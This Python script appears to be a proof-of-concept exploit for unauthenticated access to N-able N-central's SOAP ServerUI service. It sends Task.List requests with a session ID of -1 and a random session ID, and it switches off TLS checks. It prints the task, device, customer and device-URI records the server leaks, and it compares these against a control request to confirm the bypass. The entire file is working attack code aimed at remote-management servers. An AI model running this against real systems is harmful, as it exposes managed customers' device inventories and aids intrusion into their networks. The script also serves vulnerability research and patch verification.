#!/usr/bin/env python3
import argparse
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP = "http://schemas.xmlsoap.org/soap/envelope/"
NS = "http://www.n-able.com/mickey"


def envelope(session_id, device_id, appliance_id):
    return f'''<soap:Envelope xmlns:soap="{SOAP}" xmlns:soapenc="{SOAP}encoding/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:m="{NS}">
 <soap:Body><m:Task.List soap:encodingStyle="{SOAP}encoding/">
  <SessionID xsi:type="xsd:int">{session_id}</SessionID>
  <DeviceID xsi:type="xsd:int">{device_id}</DeviceID>
  <ProbeID xsi:type="xsd:int">-1</ProbeID>
  <ApplianceID xsi:type="xsd:int">{appliance_id}</ApplianceID>
  <Exportable xsi:type="xsd:boolean">false</Exportable>
  <OrderBy xsi:type="xsd:string">TaskID</OrderBy>
  <ReverseOrder xsi:type="xsd:boolean">false</ReverseOrder>
  <Offset xsi:type="xsd:int">0</Offset>
  <Limit xsi:type="xsd:int">10000</Limit>
 </m:Task.List></soap:Body>
</soap:Envelope>'''


def request(http, url, session_id, device_id, appliance_id):
    response = http.post(
        url,
        data=envelope(session_id, device_id, appliance_id),
        headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
        timeout=30,
    )
    rows = []
    count = 0
    for node in ET.fromstring(response.content).iter():
        name = node.tag.rsplit("}", 1)[-1]
        if name == "Count" and node.text:
            count = int(node.text)
        if name != "TaskArray":
            continue
        values = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in node}
        if "TaskID" in values:
            rows.append(values)
    return response.status_code, count, rows


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://n-central.local")
    selector = parser.add_mutually_exclusive_group(required=True)
    selector.add_argument("--appliance-id", type=int)
    selector.add_argument("--device-id", type=int)
    parser.add_argument("--invalid-appliance-id", default=2147483000, type=int)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    http = requests.Session()
    http.verify = False
    url = args.target.rstrip("/") + "/dms/services/ServerUI"
    device_id = args.device_id if args.device_id is not None else -1
    appliance_id = args.appliance_id if args.appliance_id is not None else -1
    status, count, rows = request(http, url, -1, device_id, appliance_id)
    control_status, control_count, _ = request(http, url, -1, device_id, args.invalid_appliance_id)
    random_status, random_count, random_rows = request(http, url, 2147483000, device_id, appliance_id)
    print("build=N-able N-central 2026.4.1.26 HF2")
    print(f"anonymous_http={status} anonymous_count={count}")
    for row in rows:
        print(
            "task={TaskID} appliance={ApplianceID} device={DeviceID} customer={CustomerID} "
            "uri={DeviceURI} name={DeviceName} module={ModuleName}".format(**row)
        )
    print(f"random_session_http={random_status} random_session_count={random_count}")
    print(f"random_session_matches={str(random_rows == rows).lower()}")
    print(f"invalid_appliance_http={control_status} invalid_appliance_count={control_count}")


if __name__ == "__main__":
    main()
